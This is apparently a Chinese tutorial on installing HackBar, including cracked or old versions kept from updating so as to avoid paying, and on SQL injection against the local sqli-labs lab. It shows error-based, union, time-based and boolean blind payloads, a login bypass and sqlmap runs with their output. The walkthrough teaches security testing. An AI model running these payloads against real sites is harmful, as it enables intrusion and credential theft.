## 四、浏览器hackbar插件安装

### 1.Google Chrome安装hackbar

由于新版hackbar改为付费的，直接安装需要付费不太方便，所以使用破解版，而且一般安装需要Google插件需要**科学上网**，对于小白来说不太方便，因此可通过**文件安装破解后的扩展程序**的方式进行安装，比较方便。
这了提供英文原版https://download.csdn.net/download/CUFEECR/12209736和汉化版https://download.csdn.net/download/CUFEECR/12209697的HackBar插件，可点击下载，解压后安装。
安装步骤示意如下：
![Google HackBar安装](https://img-blog.csdnimg.cn/20200303204004889.gif#pic_center)

### 2.Firefox安装HackBar

火狐中新版本的HackBar也是收费的，有2种方法解决：

#### 使用旧版本的HackBar

可点击https://download.csdn.net/download/CUFEECR/12209830下载。
解压后安装步骤如下：

- 打开firefox的附加组件，点击从**文件安装附加组件**；
  ![Firefox安装HackBar1](https://img-blog.csdnimg.cn/2020030319462458.png#pic_center)
- 打开 **{4c98c9c7-fc13-4622-b08a-a18923469c1c}.xpi**文件添加扩展；
  ![Firefox安装HackBar2](https://img-blog.csdnimg.cn/20200303194749615.png#pic_center)
- 关闭HackBar自动更新：
  找到HackBar插件，点右上角菜单，最后点击**选项**就会出来允许自动更新的设置，将自动更新设置为关。
  ![Firefox安装HackBar3](https://img-blog.csdnimg.cn/202003031955158.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
  **注意：
  一定记住要关闭插件的自动更新，否则浏览器会自动更新插件到收费版本！！！**
  安装完成之后，可以看到HackBar的效果：
  ![HackBar效果](https://img-blog.csdnimg.cn/20200303195147391.png#pic_center)

#### 使用功能类似的插件代替HackBar

在火狐扩展组件商店https://addons.mozilla.org/zh-CN/firefox/search/?platform=windows&q=HackBar搜索**hackbar**会出来很多类似的插件，功能基本都是一样的。
可以选择其他组件替代，如**Max HackBar**等。
![Firefox搜索HackBar](https://img-blog.csdnimg.cn/20200303195850254.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

## 五、SQL注入

### 1.GET和POST请求

- GET提交：
  请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），一般以?分割URL和传输数据，多个参数用&连接。
- POST提交：
  把提交的数据放置在HTTP包的包体中。

GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变，因此POST请求比GET请求**更安全**。

### 2.get基于报错的SQL注入

#### 发现注入点

通过url中修改对应的ID值，为正常数字、字符(单引号、双引号、括号)、反斜线来探测url中是否存在注入点。
访问[http://127.0.0.1/sqli-labs/Less-1/?id=1’](http://127.0.0.1/sqli-labs/Less-1/?id=1')，显示如下：
![SQL get error less1](https://img-blog.csdnimg.cn/2020030320182138.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
有报错信息：

> ‘‘1’’ LIMIT 0,1’

可以分析出SQL查询语句为：

```sql
select * from xxx where id = '1'' limit 0,1;
1
```

访问[http://127.0.0.1/sqli-labs/Less-2/?id=1’](http://127.0.0.1/sqli-labs/Less-2/?id=1')，显示如下：
![SQL get error less2](https://img-blog.csdnimg.cn/20200303201840645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
有报错信息：

> ‘’ LIMIT 0,1’

可以分析出SQL查询语句为：

```sql
select * from xxx where id = "1" limit 0,1;
1
```

访问[http://127.0.0.1/sqli-labs/Less-3/?id=1’](http://127.0.0.1/sqli-labs/Less-3/?id=1')，显示如下：
![SQL get error less3](https://img-blog.csdnimg.cn/20200303201925544.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
有报错信息：

> ‘‘1’’) LIMIT 0,1’

可以分析出SQL查询语句为：

```sql
select * from xxx where id = ('1') limit 0,1;
1
```

访问http://127.0.0.1/sqli-labs/Less-4/?id=1"，显示如下：
![SQL get error less4](https://img-blog.csdnimg.cn/20200303201947433.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
有报错信息：

> ‘“1"”) LIMIT 0,1’

可以分析出SQL查询语句为：

```sql
select * from xxx where id = ("1") limit 0,1;
1
```

#### get基于报错的SQL注入利用

##### （1）order by判断字段数

访问[http://127.0.0.1/sqli-labs/Less-1/?id=1’ order by 1 --+](http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 1 -- )，显示
![SQL get order by 1](https://img-blog.csdnimg.cn/20200303202020765.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
可以正常访问，2和3时也一样可以访问。
访问[http://127.0.0.1/sqli-labs/Less-1/?id=1’ order by 4 --+](http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 4 -- )，显示
![SQL get order by 4](https://img-blog.csdnimg.cn/20200303202406268.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
此时不能正常访问，从而可以判断出字段数为3。
说明：
–+相当于数据库中的注释，注释掉后面的语句。

##### （2）利用union select联合查询，获取表名

访问[http://127.0.0.1/sqli-labs/Less-1/?id=0’ union select 1,2,3 --+](http://127.0.0.1/sqli-labs/Less-1/?id=0' union select 1,2,3 -- )，显示：
![SQL get union select 1,2,3](https://img-blog.csdnimg.cn/20200303202548392.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
因探测出的字段数为3，所以`union select`后的字段数也必须为3，否则会出现异常。
访问[http://127.0.0.1/sqli-labs/Less-1/?id=0’ union select 1,user(),database() --+](http://127.0.0.1/sqli-labs/Less-1/?id=0' union select 1,user(),database() -- )，显示：
![SQL get union select 1,user(),database()](https://img-blog.csdnimg.cn/2020030320260110.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
显然暴露出数据库security。

访问[http://127.0.0.1/sqli-labs/Less-1/?id=0’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+](http://127.0.0.1/sqli-labs/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- )，显示：
![SQL get union select 1,group_concat(table_name),3](https://img-blog.csdnimg.cn/20200303202725506.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
显然，此时得到数据库内的表名。

##### （3）利用union select联合查询，获取字段名

访问[http://127.0.0.1/sqli-labs/Less-1/?id=0’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=‘users’ --+](http://127.0.0.1/sqli-labs/Less-1/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' -- )，显示：
![SQL get union select 1,group_concat(column_name),3](https://img-blog.csdnimg.cn/20200303202745222.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
即得到了指定表中所有的字段，可能比目标表中的字段要多，这是因为可能别的数据库中也有users表，这些users表中的字段也包含在内。

##### （4）利用union select联合查询，获取字段值

访问[http://127.0.0.1/sqli-labs/Less-1/?id=0’ union select 1,group_concat(username,password),3 from users --+](http://127.0.0.1/sqli-labs/Less-1/?id=0' union select 1,group_concat(username,password),3 from users -- )，显示：
![SQL get union select 1,group_concat(username,password),3](https://img-blog.csdnimg.cn/20200303202903931.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
得到了指定表中所有数据。

# Python全栈（五）Web安全攻防之6.SQL注入和绕过

## 一、GET请求盲注

### 1.盲注简介

#### 盲注介绍

Blind SQL（盲注）是注入攻击的一种，向数据库发生true或false这样的问题，并**根据应用程序返回的信息判断结果**。
这种攻击的出现是因为应用程序配置为只显示常规错误，但并没有解决SQL注入存在的代码问题。

#### 盲注种类

- 时间盲注
- 布尔盲注

### 2.GET基于时间的盲注

#### 原理概述

在MySQL中，`if(exp1,exp2,exp3)`相当于三元运算符：
exp1为True则执行exp2，否则执行exp3。
所以以下语句：

```sql
if(ascii(substr(database(),1,1))=115,1,sleep(3))
1
```

如果`ascii(substr(database(),1,1))=115`执行成功则为1，否则执行`sleep(3)`。
测试：

```sql
select if(ascii(substr(database(),1,1))=115,1,sleep(3));
1
```

打印

```sql
+--------------------------------------------------+
| if(ascii(substr(database(),1,1))=115,1,sleep(3)) |
+--------------------------------------------------+
|                                                1 |
+--------------------------------------------------+
1 row in set (0.01 sec)
123456
```

返回结果为1，也印证了`ascii(substr(database(),1,1))=115`为True。
该语句的意思是：当前数据库名子字符串（从第一个位置开始截取1个字符，即第一个字符）对应的ASCII码为115，当前数据库为security，首字母为s，其对应的ASCII码为115，所以为True。

#### 判断是否存在注入点

访问[http://127.0.0.1/sqli-labs/Less-5/?id=1’ and if(1=0,1,sleep(3)) --+](http://127.0.0.1/sqli-labs/Less-5/?id=1' and if(1=0,1,sleep(3)) -- )，显示
![SQL Injection GET time id=1' and if(1=0,1,sleep(3))](https://img-blog.csdnimg.cn/20200305122254223.gif#pic_center)
显然，请求延迟了3秒，说明存在注入点，可以进行下一步操作。

#### 判断数据库长度

数据库长度指数据库名的字符数。
访问[http://127.0.0.1/sqli-labs/Less-5/?id=1’ and if(length(database())=8,sleep(3),1) --+](http://127.0.0.1/sqli-labs/Less-5/?id=1' and if(length(database())=8,sleep(3),1) -- )，显示：
![SQL Injection GET time id=1' and if(length(database())=8,sleep(3),1) --+](https://img-blog.csdnimg.cn/20200305122524948.gif#pic_center)
请求延迟了3秒，说明数据库长度为8（8是经过很多次尝试得出的，开始猜一个可能的值，如果无延迟则继续尝试）。

#### 判断数据库名字

访问[http://127.0.0.1/sqli-labs/Less-5/?id=1’ and if(ascii(substr(database(),1,1))=115,1,sleep(3)) --+](http://127.0.0.1/sqli-labs/Less-5/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(3)) -- )，显示：
![SQL Injection GET time id=1' and  if(ascii(substr(database(),1,1))=115,1,sleep(3)) --+](https://img-blog.csdnimg.cn/20200305122609862.gif#pic_center)
显然，请求未延迟，说明数据库的首字母为**s**，再依次对接下来的字母进行尝试，即可破解出数据库名。

#### sqlmap安全测试

用sqlmap测试时间盲注如下：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique T --current-db
1
```

显示：
![sqlmap Injection time](https://img-blog.csdnimg.cn/2020030512305767.gif#pic_center)
显然，花的时间较多，探测出当前数据库为security。
得到的Payload如下：
![sqlmap Injection time payload](https://img-blog.csdnimg.cn/20200305123529786.png#pic_center)
即**id=1’ AND (SELECT 9017 FROM (SELECT(SLEEP(5)))oDkD)-- myGo**，利用其进行测试：
访问[http://127.0.0.1/sqli-labs/Less-5/?id=1’ AND (SELECT 9017 FROM (SELECT(SLEEP(5)))oDkD)-- myGo --+](http://127.0.0.1/sqli-labs/Less-5/?id=1' AND (SELECT 9017 FROM (SELECT(SLEEP(5)))oDkD)-- myGo -- )，显然，请求延迟了5秒。

### 3.GET基于Boolean的盲注

#### 原理概述

在进行基于布尔的盲注时，我们通常采用下面的办法猜解字符串：

| SQL语句                          | 显示状态 | 说明状态 |
| -------------------------------- | -------- | -------- |
| ((select length(database()))>5)  | 正常     | true     |
| ((select length(database()))>10) | 无显示   | false    |
| ((select length(database()))>7)  | 正常     | true     |
| ((select length(database()))>8)  | 无显示   | false    |

| SQL语句                                      | 显示状态 | 说明状态 |
| -------------------------------------------- | -------- | -------- |
| ((select ascii(substr(database(),1,1)))>75)  | 正常     | true     |
| ((select ascii(substr(database(),1,1)))>100) | 正常     | true     |
| ((select ascii(substr(database(),1,1)))>113) | 正常     | true     |
| ((select ascii(substr(database(),1,1)))>119) | 无显示   | false    |
| ((select ascii(substr(database(),1,1)))>116) | 无显示   | false    |
| ((select ascii(substr(database(),1,1)))>114) | 正常     | true     |
| ((select ascii(substr(database(),1,1)))>115) | 无显示   | false    |

```sql
select length(database()); 

select substr(database(),1,1); 

select ascii(substr(database(),1,1)); 

select ascii(substr(database(),1,1)) > N; 

select ascii(substr(database(),1,1)) = N; 

select ascii(substr(database(),1,1)) < N;
1234567891011
```

#### 判断数据库长度

在数据库中测试：

```sql
select length(database()) = 8;
1
```

打印

```sql
+------------------------+
| length(database()) = 8 |
+------------------------+
|                      1 |
+------------------------+
1 row in set (0.01 sec)   
123456
```

返回1，即返回True，当前数据库的长度为8。
再次测试：

```sql
select * from users where id = 1 and length(database()) = 8;
1
```

打印

```sql
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)      
123456
```

访问[http://127.0.0.1/sqli-labs/Less-5/?id=1’ and length(database())=8 --+](http://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8 -- )，显示：
![SQL Injection GET boolean id=1' and  length(database())=8 --+](https://img-blog.csdnimg.cn/20200305122737199.gif#pic_center)
出现了**You are in…**，即正常访问。
再访问[http://127.0.0.1/sqli-labs/Less-5/?id=1’ and length(database())=9 --+](http://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=9 -- )，显示：
![SQL Injection GET boolean id=1' and  length(database())=9 --+](https://img-blog.csdnimg.cn/20200305122854761.gif#pic_center)

此时未出现**You are in…**，显然，数据库长度为8。

#### 判断数据库名字

数据库中测试：

```sql
select * from users where id = 1 and (select ascii(substr(database(),1,1))=115);
1
```

打印

```sql
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)   
123456
```

访问[http://127.0.0.1/sqli-labs/Less-5/?id=1’ and (select ascii(substr(database(),1,1))=115) --+](http://127.0.0.1/sqli-labs/Less-5/?id=1' and (select ascii(substr(database(),1,1))=115) -- )和[http://127.0.0.1/sqli-labs/Less-5/?id=1’ and (select ascii(substr(database(),1,1))=116) --+](http://127.0.0.1/sqli-labs/Less-5/?id=1' and (select ascii(substr(database(),1,1))=116) -- )，显示如下：
![SQL Injection GET boolean id=1' and  (select ascii(substr(database(),1,1))=115 and 116) --+](https://img-blog.csdnimg.cn/20200305123015725.gif#pic_center)
显然，第一个字母为s。

#### sqlmap安全测试

用sqlmap测试布尔盲注如下：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --current-db
1
```

显示：
![sqlmap Injection boolean](https://img-blog.csdnimg.cn/20200305123556355.gif#pic_center)
花的时间较少，也探测出当前数据库为security。
在这种情况下，布尔盲注的效率相对较高。
得到的Payload如下：
![sqlmap Injection boolean payload](https://img-blog.csdnimg.cn/20200305123649937.png#pic_center)
即**id=1’ AND 3835=3835 AND ‘YqTv’='YqTv**，利用其进行测试：
访问[http://127.0.0.1/sqli-labs/Less-5/?id=1’ AND 3835=3835 AND ‘YqTv’='YqTv --+](http://127.0.0.1/sqli-labs/Less-5/?id=1' AND 3835=3835 AND 'YqTv'='YqTv -- )，此时不能正常访问。

## 二、POST请求注入

### 1.POST基于错误的注入

#### POST请求的特点

- POST请求不能被缓存下来
- POST请求不会保存在浏览器浏览记录中
- 以POST请求的URL无法保存为浏览器书签
- POST请求没有长度限制

#### POST基于错误单引号注入

注入点位置发生了变化，在浏览器中已经无法直接进行查看与修改，可以借助对应的插件完成修改任务。
http://127.0.0.1/sqli-labs/Less-11/表单提交进行测试如下：
![SQL Injection POST error single quote 1](https://img-blog.csdnimg.cn/20200305123743522.gif#pic_center)
出现报错

> ‘admin’ LIMIT 0,1’

可以猜测SQL语句为：

```sql
select * from xxx where uname = 'uname' or 1 = 1 -- ' and passwd = 'password';
1
```

进行测试：
用户名输入**admin’ or 1 = 1 –** ，密码随便输入一个，显示：
![SQL Injection POST error single quote 2](https://img-blog.csdnimg.cn/20200305123805933.gif#pic_center)
显然，此时正常登录。

#### POST基于错误双引号注入

和基于错误单引号一样，在浏览器中无法查看与修改，需要借助借助对应的插件完成修改任务。
http://127.0.0.1/sqli-labs/Less-12/表单提交进行测试如下：
![SQL Injection POST error double quote 1](https://img-blog.csdnimg.cn/20200305123839723.gif#pic_center)
出现报错

> ‘123") LIMIT 0,1’

可以猜测SQL语句为：

```sql
select * from xxx where uname = ("uname") or 1 = 1 -- ") and passwd = 'password';
1
```

进行测试：
用户名输入**admin") or 1 = 1 –** ，密码随便输入一个，显示：
![SQL Injection POST error double quote 2](https://img-blog.csdnimg.cn/20200305123929779.gif#pic_center)
显然，此时也正常登录。

#### sqlmap安全测试

（1）单引号错误注入测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-11/ --data="uname=admin&passwd=123" --current-db
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[.]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [)]     | .'| . |                                                                                                                                 
|___|_  [.]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 20:11:23 /2020-03-04/                                                                                                                      
                                                                                                                                                          
[20:11:23] [INFO] testing connection to the target URL                                                                                                    
[20:11:23] [INFO] checking if the target is protected by some kind of WAF/IPS                                                                             
[20:11:23] [INFO] testing if the target URL content is stable                                                                                             
[20:11:24] [INFO] target URL content is stable                                                                                                            
[20:11:24] [INFO] testing if POST parameter 'uname' is dynamic                                                                                            
[20:11:24] [WARNING] POST parameter 'uname' does not appear to be dynamic                                                                                 
[20:11:24] [INFO] heuristic (basic) test shows that POST parameter 'uname' might be injectable (possible DBMS: 'MySQL')                                   
[20:11:24] [INFO] heuristic (XSS) test shows that POST parameter 'uname' might be vulnerable to cross-site scripting (XSS) attacks                        
[20:11:24] [INFO] testing for SQL injection on POST parameter 'uname'                                                                                     
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]                                            
                                                                                                                                                          
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]                             
                                                                                                                                                          
[20:11:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                              
[20:11:26] [WARNING] reflective value(s) found and filtering out                                                                                          
[20:11:26] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                      
[20:11:26] [INFO] testing 'Generic inline queries'                                                                                                        
[20:11:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'                                                              
[20:11:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'                                                               
[20:11:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'                                                         
[20:11:29] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'                                                  
[20:11:31] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'                                         
[20:11:32] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'                                          
[20:11:34] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'                                              
[20:11:37] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'                                               
[20:11:38] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'                                         
[20:11:40] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'                                          
[20:11:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'                                                                      
[20:11:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'                                                     
[20:11:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'                                                                           
[20:11:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'                                                          
[20:11:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'                                                                      
[20:11:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'                                                     
[20:11:41] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'                                                                  
[20:11:42] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'                                                 
[20:11:42] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'                                                                   
[20:11:42] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'                                                  
[20:11:42] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'                                                                            
[20:11:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'                                                                             
[20:11:43] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                   
[20:11:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                        
[20:11:45] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                               
[20:11:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                                                                    
[20:11:48] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                       
[20:11:49] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                            
[20:11:50] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                             
[20:11:50] [INFO] POST parameter 'uname' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable                
[20:11:50] [INFO] testing 'MySQL inline queries'                                                                                                          
[20:11:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'                                                                                     
[20:11:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries'                                                                                               
[20:11:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'                                                                       
[20:11:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'                                                                                 
[20:11:50] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'                                                                        
[20:11:50] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'                                                                                  
[20:11:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                                            
[20:12:00] [INFO] POST parameter 'uname' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                    
[20:12:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                                                                  
[20:12:00] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'                                                                                    
[20:12:00] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found     
[20:12:01] [INFO] target URL appears to be UNION injectable with 2 columns                                                                                
[20:12:01] [INFO] POST parameter 'uname' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable                                                       
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N]                                                              
                                                                                                                                                          
sqlmap identified the following injection point(s) with a total of 1074 HTTP(s) requests:                                                                 
---                                                                                                                                                       
Parameter: uname (POST)                                                                                                                                   
    Type: error-based                                                                                                                                     
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)                                                              
    Payload: uname=admin' AND (SELECT 2046 FROM(SELECT COUNT(*),CONCAT(0x716a707071,(SELECT (ELT(2046=2046,1))),0x7171626271,FLOOR(RAND(0)*2))x FROM INFOR
MATION_SCHEMA.PLUGINS GROUP BY x)a)-- cRtr&passwd=123                                                                                                     
                                                                                                                                                          
    Type: time-based blind                                                                                                                                
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                             
    Payload: uname=admin' AND (SELECT 5495 FROM (SELECT(SLEEP(5)))pVWe)-- Kzkg&passwd=123                                                                 
                                                                                                                                                          
    Type: UNION query                                                                                                                                     
    Title: MySQL UNION query (NULL) - 2 columns                                                                                                           
    Payload: uname=-1041' UNION ALL SELECT CONCAT(0x716a707071,0x56476a6e76776f4a657355716c53774761706f57684856426e666965477954624a78444866597550,0x717162
6271),NULL#&passwd=123                                                                                                                                    
---                                                                                                                                                       
[20:12:02] [INFO] the back-end DBMS is MySQL                                                                                                              
[20:12:02] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'                          
back-end DBMS: MySQL >= 5.0                                                                                                                               
[20:12:02] [INFO] fetching current database                                                                                                               
current database: 'security'                                                                                                                              
[20:12:02] [INFO] fetched data logged to text files under 'xxxx\output\127.0.0.1'                                         
                                                                                                                                                          
[*] ending @ 20:12:02 /2020-03-04/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                          
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102
```

（2）双引号错误注入测试：
先建立一个**target.txt**文档，再按下述步骤获取参数存入该文档：
![sqlmap error double quote](https://img-blog.csdnimg.cn/20200305124040253.gif#pic_center)
再测试：

```shell
python sqlmap.py -r "xxxx\target.txt" -p passwd --technique E
1
```

打印

```shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:22:24 /2020-03-04/

[20:22:24] [CRITICAL] specified HTTP request file 'xxxx\target.txt' does not exist

[*] ending @ 20:22:24 /2020-03-04/


E:\SQLMAP\sqlmapproject-sqlmap-0605f14
λ python sqlmap.py -r C:\Users\Lenovo\Desktop\target.txt -p passwd --technique E
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:23:02 /2020-03-04/

[20:23:02] [INFO] parsing HTTP request from 'xxxx\target.txt'
[20:23:02] [WARNING] provided value for parameter 'passwd' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[20:23:02] [INFO] resuming back-end DBMS 'mysql'
[20:23:02] [INFO] testing connection to the target URL
[20:23:03] [INFO] heuristic (basic) test shows that POST parameter 'passwd' might be injectable (possible DBMS: 'MySQL')
[20:23:03] [INFO] testing for SQL injection on POST parameter 'passwd'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[20:23:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:23:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:23:07] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:23:08] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:23:09] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[20:23:10] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[20:23:12] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
